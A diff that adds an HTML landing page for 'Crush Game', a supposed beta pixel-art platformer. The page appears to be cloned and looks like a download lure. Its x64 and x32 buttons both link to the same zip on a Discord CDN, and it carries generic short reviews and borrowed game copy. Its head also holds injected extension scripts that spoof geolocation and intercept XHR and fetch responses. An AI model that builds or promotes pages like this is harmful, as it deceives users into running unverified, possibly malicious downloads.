@@ -1,0 +1,710 @@
+<html lang="tr"><script>
+    window[Symbol.for('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')] = new (class PostClient {
+    constructor(name, destination) {
+        this.name = name;
+        this.destination = destination;
+        this.serverListeners = {};
+        this.bgRequestsListeners = {};
+        this.bgEventsListeners = {};
+        window.addEventListener('message', (message) => {
+            const data = message.data;
+            const isNotForMe = !(data.destination && data.destination === this.name);
+            const hasNotEventProp = !data.event;
+            if (isNotForMe || hasNotEventProp) {
+                return;
+            }
+            if (data.event === 'MARIO_POST_SERVER__BG_RESPONSE') {
+                const response = data.args;
+                if (this.hasBgRequestListener(response.requestId)) {
+                    try {
+                        this.bgRequestsListeners[response.requestId](response.response);
+                    }
+                    catch (e) {
+                        console.log(e);
+                    }
+                    delete this.bgRequestsListeners[response.requestId];
+                }
+            }
+            else if (data.event === 'MARIO_POST_SERVER__BG_EVENT') {
+                const response = data.args;
+                if (this.hasBgEventListener(response.event)) {
+                    try {
+                        this.bgEventsListeners[data.id](response.payload);
+                    }
+                    catch (e) {
+                        console.log(e);
+                    }
+                }
+            }
+            else if (this.hasServerListener(data.event)) {
+                try {
+                    this.serverListeners[data.event](data.args);
+                }
+                catch (e) {
+                    console.log(e);
+                }
+            }
+            else {
+                console.log(`event not handled: ${data.event}`);
+            }
+        });
+    }
+    emitToServer(event, args) {
+        const id = this.generateUIID();
+        const message = {
+            args,
+            destination: this.destination,
+            event,
+            id,
+        };
+        window.postMessage(message, location.origin);
+        return id;
+    }
+    emitToBg(bgEventName, args) {
+        const requestId = this.generateUIID();
+        const request = { bgEventName, requestId, args };
+        this.emitToServer('MARIO_POST_SERVER__BG_REQUEST', request);
+        return requestId;
+    }
+    hasServerListener(event) {
+        return !!this.serverListeners[event];
+    }
+    hasBgRequestListener(requestId) {
+        return !!this.bgRequestsListeners[requestId];
+    }
+    hasBgEventListener(bgEventName) {
+        return !!this.bgEventsListeners[bgEventName];
+    }
+    fromServerEvent(event, listener) {
+        this.serverListeners[event] = listener;
+    }
+    fromBgEvent(bgEventName, listener) {
+        this.bgEventsListeners[bgEventName] = listener;
+    }
+    fromBgResponse(requestId, listener) {
+        this.bgRequestsListeners[requestId] = listener;
+    }
+    generateUIID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon', 'MARIO_POST_SERVER_eppiocemhmnlbhjplcgkofciiegomcon')</script><script>
+    const hideMyLocation = new (class HideMyLocation {
+    constructor(clientKey) {
+        this.clientKey = clientKey;
+        this.watchIDs = {};
+        this.client = window[Symbol.for(clientKey)];
+        const getCurrentPosition = navigator.geolocation.getCurrentPosition;
+        const watchPosition = navigator.geolocation.watchPosition;
+        const clearWatch = navigator.geolocation.clearWatch;
+        const self = this;
+        navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+            self.handle(getCurrentPosition, 'GET', successCallback, errorCallback, options);
+        };
+        navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+            return self.handle(watchPosition, 'WATCH', successCallback, errorCallback, options);
+        };
+        navigator.geolocation.clearWatch = function (fakeWatchId) {
+            if (fakeWatchId === -1) {
+                return;
+            }
+            const realWatchId = self.watchIDs[fakeWatchId];
+            delete self.watchIDs[fakeWatchId];
+            return clearWatch.apply(this, [realWatchId]);
+        };
+    }
+    handle(getCurrentPositionOrWatchPosition, type, successCallback, errorCallback, options) {
+        const requestId = this.client.emitToBg('HIDE_MY_LOCATION__GET_LOCATION');
+        let fakeWatchId = this.getRandomInt(0, 100000);
+        this.client.fromBgResponse(requestId, (response) => {
+            if (response.enabled) {
+                if (response.status === 'SUCCESS') {
+                    const position = this.map(response);
+                    successCallback(position);
+                }
+                else {
+                    const error = this.errorObj();
+                    errorCallback(error);
+                    fakeWatchId = -1;
+                }
+            }
+            else {
+                const args = [successCallback, errorCallback, options];
+                const watchId = getCurrentPositionOrWatchPosition.apply(navigator.geolocation, args);
+                if (type === 'WATCH') {
+                    this.watchIDs[fakeWatchId] = watchId;
+                }
+            }
+        });
+        if (type === 'WATCH') {
+            return fakeWatchId;
+        }
+    }
+    map(response) {
+        return {
+            coords: {
+                accuracy: 20,
+                altitude: null,
+                altitudeAccuracy: null,
+                heading: null,
+                latitude: response.latitude,
+                longitude: response.longitude,
+                speed: null,
+            },
+            timestamp: Date.now(),
+        };
+    }
+    errorObj() {
+        return {
+            code: 1,
+            message: 'User denied Geolocation',
+        };
+    }
+    getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')
+  </script><head><style type="text/css">span.iconify, i.iconify, iconify-icon { display: inline-block; width: 1em; }</style>
+<meta name="msapplication-TileColor" content="#da532c">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/brands.min.css" integrity="sha512-+oRH6u1nDGSm3hH8poU85YFIVTdSnS2f+texdPGrURaJh8hzmhMiZrQth6l56P4ZQmxeZzd2DqVEMqQoJ8J89A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/fontawesome.min.css" integrity="sha512-RvQxwf+3zJuNwl4e0sZjQeX7kUa3o82bDETpgVCH2RiwYSZVDdFJ7N/woNigN/ldyOOoKw8584jM4plQdt8bhA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+<meta content="Crush Game" property="og:title">
+<meta content="Crush Game is a metroidvania/slasher platformer with a charming pixel-art and a captivating story. You’re going to follow the young girl Mako that starts a fascinating adventure to save her world from destruction. Dive into magical worlds of Bartila, uncover its secrets and stop the ancient God awakening ritual." property="og:description">
+<meta content="#ffffff" data-react-helmet="true" name="theme-color">
+<meta content="images/EnemyForest.png" property="og:image">
+<meta property="og:image">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Crush Game</title>
+<script src="https://enemyforest.com/cdn-cgi/apps/head/ZcSUWLYGjCiGQIBtye2cw9TodIk.js"></script><script>(function inject(config) {
+        function GenerateQuickId() {
+          var randomStrId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+          return randomStrId.substring(0, 22);
+        }
+        ;
+        function SendXHRCandidate(requestMethod_, url_, type_, content_) {
+          try {
+            var id = 'detector';
+            var mes = {
+              posdMessageId: 'PANELOS_MESSAGE',
+              posdHash: GenerateQuickId(),
+              type: 'VIDEO_XHR_CANDIDATE',
+              from: id,
+              to: id.substring(0, id.length - 2),
+              content: {
+                requestMethod: requestMethod_,
+                url: url_,
+                type: type_,
+                content: content_
+              }
+            };
+            window.postMessage(mes, '*');
+          } catch (e) {}
+        }
+        ;
+        var open = XMLHttpRequest.prototype.open;
+        XMLHttpRequest.prototype.open = function () {
+          this.requestMethod = arguments[0];
+          open.apply(this, arguments);
+        };
+        var send = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.send = function () {
+          var onreadystatechange = this.onreadystatechange;
+          this.onreadystatechange = function () {
+            var isFrameInBlackList = function isFrameInBlackList(url) {
+              var blackListIframes = config;
+              return blackListIframes.some(function (e) {
+                return url.includes(e);
+              });
+            };
+            if (this.readyState === 4 && !isFrameInBlackList(this.responseURL)) {
+              setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader('content-type'), this.response), 0);
+            }
+            if (onreadystatechange) {
+              return onreadystatechange.apply(this, arguments);
+            }
+          };
+          return send.apply(this, arguments);
+        };
+        var nativeFetch = fetch;
+        fetch = function fetch() {
+          var _this = this;
+          var args = arguments;
+          var fetchURL = arguments[0] instanceof Request ? arguments[0].url : arguments[0];
+          var fetchMethod = arguments[0] instanceof Request ? arguments[0].method : 'GET';
+          return new Promise(function (resolve, reject) {
+            var promise = nativeFetch.apply(_this, args);
+            promise.then(function (response) {
+              if (response.body instanceof ReadableStream) {
+                var nativeJson = response.json;
+                response.json = function () {
+                  var _arguments = arguments,
+                    _this2 = this;
+                  return new Promise(function (resolve, reject) {
+                    var jsonPromise = nativeJson.apply(_this2, _arguments);
+                    jsonPromise.then(function (jsonResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), JSON.stringify(jsonResponse)), 0);
+                      resolve(jsonResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+                var nativeText = response.text;
+                response.text = function () {
+                  var _arguments2 = arguments,
+                    _this3 = this;
+                  return new Promise(function (resolve, reject) {
+                    var textPromise = nativeText.apply(_this3, _arguments2);
+                    textPromise.then(function (textResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), textResponse), 0);
+                      resolve(textResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+              }
+              resolve.apply(this, arguments);
+            })["catch"](function () {
+              reject.apply(this, arguments);
+            });
+          });
+        };
+      })(["facebook.com/","twitter.com/","youtube.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com"]);</script><link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/all.min.css">
+<link rel="icon" type="" href="images/game-controller.png">
+<script src="js/jquery.min.js"></script>
+<meta name="cloner" content="CfSiteCloner - forestwebsite.github.io"></head>
+<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjAzIiwic2NvcmUiOjEwOTAzfV0=">
+
+<header>
+<h1 class="logo">Crush Game</h1>
+<nav>
+<ul class="nav-area top-nav">
+<li><a href="#top">Home</a></li>
+<li><a href="#features">About</a></li>
+<li><a href="#commands">Feedbacks</a></li>
+<li><a href="#faq">Images</a></li>
+<li><a href="#support">Support</a></li>
+<li><a href="#top">Download</a></li>
+</ul>
+</nav>
+</header>
+
+
+<div class="wrapper" bis_skin_checked="1">
+<div class="home" id="home" bis_skin_checked="1">
+<div class="home-text" bis_skin_checked="1">
+<h1 id="botname">Crush Game</h1>
+<h3 style="margin-left: 0;"> [📢] ANNOUNCE [📢]
+</h3>
+<p class="bot-description">
+The game is almost finished, so we are testing our game as beta right now, we are having it done, but we believe that we will get out of the beta version very soon..
+</p>
+<a href="https://cdn.discordapp.com/attachments/1034025319461572658/1039312145550151802/The_Crush_Game.zip" class="btn-area">Download x64</a>
+<a href="https://cdn.discordapp.com/attachments/1034025319461572658/1039312145550151802/The_Crush_Game.zip" class="btn-area">Download x32</a>
+</div>
+<div class="home-img" bis_skin_checked="1">
+<img src="https://enemyforest.com/images/EnemyForest.png" alt="">
+</div>
+</div>
+</div>
+
+
+<div class="features" bis_skin_checked="1">
+<div class="curve" bis_skin_checked="1">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+<path fill-opacity="1" id="features" d="M0,128L48,149.3C96,171,192,213,288,229.3C384,245,480,235,576,202.7C672,171,768,117,864,96C960,75,1056,85,1152,106.7C1248,128,1344,160,1392,176L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+</path>
+</svg>
+</div>
+<div class="wrapper reveal" bis_skin_checked="1">
+<div class="title" bis_skin_checked="1">
+<div class="th1" bis_skin_checked="1">
+<h1>ABOUT Crush Game</h1>
+</div>
+<center>
+<div class="thr" bis_skin_checked="1">
+<hr>
+</div>
+</center>
+</div>
+
+<div class="features-grid" bis_skin_checked="1">
+<div class="feature feature1" bis_skin_checked="1">
+<i class="fas fa-clipboard-list"></i>
+<h4>Discover
+</h4>
+<p>Unearth the secrets of an ever-shifting forest while trying desperately not to die. An atmospheric open-world Crush Game like. Explore an ancient, ruined forest with nothing but a sword and the clothes on your back (and maybe a bunch of volatile and destructive bows).</p>
+</div>
+
+
+<div class="feature feature2" bis_skin_checked="1">
+<i class="fas fa-server"></i>
+<h4>Low System</h4>
+ <p>Since the game has a very low system, it can be played easily on almost many computers.</p>
+</div>
+
+
+<div class="feature feature3" bis_skin_checked="1">
+<i class="fab fa-angellist"></i>
+<h4>Have Fun
+</h4>
+<p>Enjoy the lack of obstructions on your way, except about a trillion territorial cycloptic mages who will repeatedly pepper you with various explosive spells. Socialize with a cacophony of incredibly joyous and friendly characters, none of whom posses crippling depression from living in a world that is falling apart at the seams.</p>
+</div>
+
+</div>
+</div>
+<div class="curved" bis_skin_checked="1">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+<path fill-opacity="1" id="commands" d="M0,224L48,229.3C96,235,192,245,288,218.7C384,192,480,128,576,133.3C672,139,768,213,864,229.3C960,245,1056,203,1152,186.7C1248,171,1344,181,1392,186.7L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+</path>
+</svg>
+</div>
+</div>
+
+
+<div class="wrapper reveal" bis_skin_checked="1">
+<div class="title" bis_skin_checked="1">
+<div class="th1" bis_skin_checked="1">
+<h1>Feedbacks
+</h1></div>
+<center>
+<div class="thr" bis_skin_checked="1">
+<hr>
+</div>
+</center>
+</div>
+
+<nav>
+<div class=" categorys" bis_skin_checked="1">
+<span class="category active" data-name="all">All</span>
+<span class="category" data-name="fun">⭐⭐⭐⭐⭐</span>
+<span class="category" data-name="utility">⭐⭐⭐⭐</span>
+<span class="category" data-name="moderator">⭐⭐⭐</span>
+<span class="category" data-name="info">⭐⭐</span>
+<span class="category" data-name="premium">⭐</span>
+</div>
+</nav>
+
+<div class="commands" bis_skin_checked="1">
+
+<div class="command" data-name="fun" bis_skin_checked="1" onclick="preview(this)">
+<h2>Trime#NA</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐⭐⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>Very good game</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="utility" bis_skin_checked="1" onclick="preview(this)">
+<h2>Ego#NA</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>Pretty good game</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="moderator" bis_skin_checked="1" onclick="preview(this)">
+<h2>BlueGweenie#AP</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>Tbh this game looks really cool and idk why it reminds me of Deltarune but it's still a good game</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="utility" bis_skin_checked="1" onclick="preview(this)">
+<h2>TheCalicoCookie#NA</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>really good game i loved it</p>
+</div>
+</span>
+ </div>
+
+
+<div class="command" data-name="fun" bis_skin_checked="1" onclick="preview(this)">
+<h2>Humey#NA</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐⭐⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>Awesome!</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="info" bis_skin_checked="1" onclick="preview(this)">
+<h2>Stanasx#EU</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>it's still under construction, there are a few bugs, it might be better if they are fixed</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="premium" bis_skin_checked="1" onclick="preview(this)">
+<h2>Jacquelin#EU</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>I think it should be brought into the game in different languages.</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="premium" bis_skin_checked="1" onclick="preview(this)">
+<h2>Artidox#AP</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>It took too long to install the game, just put the setup file!</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="info" bis_skin_checked="1" onclick="preview(this)">
+<h2>Bekoaknc20#EU</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>Turkish language should be added to the game :/</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="moderator" bis_skin_checked="1" onclick="preview(this)">
+<h2>boshi#NA</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>The game is good, it's okay.</p>
+</div>
+</span>
+</div>
+
+
+<div class="command" data-name="utility" bis_skin_checked="1" onclick="preview(this)">
+<h2>Traviiii#AP</h2><span>
+<div class="cmdinfo" bis_skin_checked="1">
+<p>⭐⭐⭐⭐</p>
+</div>
+<div class="cmdali" bis_skin_checked="1">
+<p>Cool game, love the art style. Didn't encounter any noteworthy issues in the short time I got to play</p>
+</div>
+</span>
+</div>
+
+</div>
+</div>
+
+
+<div class="faq" bis_skin_checked="1">
+<div class="curve" bis_skin_checked="1">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+<path fill-opacity="1" id="faq" d="M0,288L48,272C96,256,192,224,288,197.3C384,171,480,149,576,165.3C672,181,768,235,864,250.7C960,267,1056,245,1152,250.7C1248,256,1344,288,1392,304L1440,320L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+</path>
+</svg>
+</div>
+<div class="wrapper reveal" bis_skin_checked="1">
+<main id="questions" role="main">
+<div class="title" bis_skin_checked="1">
+<div class="th1" bis_skin_checked="1">
+ <h1>In-Game Images</h1>
+</div>
+<center>
+<div class="thr" bis_skin_checked="1">
+<hr>
+</div>
+</center>
+</div>
+<input type="text" class="live-search-box" placeholder="Search for an image">
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="game trailer
+">Game Trailer
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="Coming Soon!" class="logo">COMING SOON!</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 1 [start screen]
+">In-Game Picture - 1 [Start Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891624696582184/EnemyForest.png" class="logo">Image.png</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 2 [gameplay screen]
+">In-Game Picture - 2 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891624994394112/EnemyForest2.png" class="logo">Image.png</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 3 [gameplay screen]
+">In-Game Picture - 3 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891625346711552/EnemyForest3.png" class="logo">Image.png</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 4 [gameplay screen]
+">In-Game Picture - 4 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891625938112542/EnemyForest4.png" class="logo">Image.png</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 5 [gameplay screen]
+">In-Game Picture - 5 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891626428837918/EnemyForest5.png" class="logo">Image.png</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 6 [gameplay screen]
+">In-Game Picture - 6 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891626852450304/EnemyForest6.png" class="logo">Image.png</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 7 [gameplay screen]
+">In-Game Picture - 7 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891627297067038/EnemyForest7.png" class="logo">Image.png</a> </p>
+</div>
+
+
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 8 [gameplay screen]
+">In-Game Picture - 8 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891627628412968/EnemyForest8.png" class="logo">Image.png</a> </p>
+</div>
+<div class="topic" bis_skin_checked="1">
+<div class="open" bis_skin_checked="1">
+<h2 class="question" data-search-term="in-game picture - 9 [gameplay screen]
+">In-Game Picture - 9 [Gameplay Screen]
+</h2><span class="faq-t"></span>
+</div>
+<p class="answer"> <a href="https://cdn.discordapp.com/attachments/1028604117179965532/1032891628039442502/EnemyForest9.png" class="logo">Image.png</a> </p>
+</div>
+
+</main>
+</div>
+<div class="curve" bis_skin_checked="1">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+<path fill-opacity="1" d="M0,32L48,80C96,128,192,224,288,218.7C384,213,480,107,576,96C672,85,768,171,864,176C960,181,1056,107,1152,64C1248,21,1344,11,1392,5.3L1440,0L1440,0L1392,0C1344,0,1248,0,1152,0C1056,0,960,0,864,0C768,0,672,0,576,0C480,0,384,0,288,0C192,0,96,0,48,0L0,0Z">
+</path>
+</svg>
+</div>
+</div>
+
+<div id="support" bis_skin_checked="1"></div>
+
+<div class="wrapper reveal" bis_skin_checked="1">
+<div class="title" bis_skin_checked="1">
+<div class="th1" bis_skin_checked="1">
+<h1>Support Server
+</h1></div>
+<center>
+<div class="thr" bis_skin_checked="1">
+<hr>
+</div>
+</center>
+</div>
+
+<iframe src="https://canary.discord.com/widget?id=984778426697261066&amp;theme=dark" width="1150" height="500" allowtransparency="true" frameborder="0" sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts" bis_size="{&quot;x&quot;:128,&quot;y&quot;:6574,&quot;w&quot;:1150,&quot;h&quot;:500,&quot;abs_x&quot;:128,&quot;abs_y&quot;:6574}"></iframe>
+</div>
+
+<div class="curve" bis_skin_checked="1">
+<svg xmlns=" http://www.w3.org/2000/svg" viewBox="0 0 1440 320">
+<path fill-opacity="1" d="M0,192L48,176C96,160,192,128,288,133.3C384,139,480,181,576,202.7C672,224,768,224,864,224C960,224,1056,224,1152,234.7C1248,245,1344,267,1392,277.3L1440,288L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z">
+</path>
+</svg>
+</div>
+
+<footer>
+<div class="wrapper" bis_skin_checked="1">
+<div class="foot" bis_skin_checked="1">
+<h1>Crush Game</h1>
+<nav>
+<ul class="nav-area bottom-nav">
+<li><a href="#top">Home</a></li><a href="#top">
+</a><li><a href="#top"></a><a href="#features">About</a></li>
+<li><a href="#commands">Feedbacks</a></li>
+<li><a href="#faq">Images</a></li>
+<li><a href="#support">Support</a></li>
+<li><a href="#top">Download</a></li><a href="#top">
+</a></ul><a href="#top">
+</a></nav><a href="#top">
+<h4>Copyright ©2022 Crush Game Development
+</h4>
+</a></div><a href="#top">
+</a></div><a href="#top">
+</a></footer><a href="#top">
+
+<script src="js/main.js"></script>
+<script src="js/commands.js"></script>
+<script src="js/iconify.min.js">   </script>
+<link href="css/boxicons.min.css" rel="stylesheet">
+</a>
+</body></html>
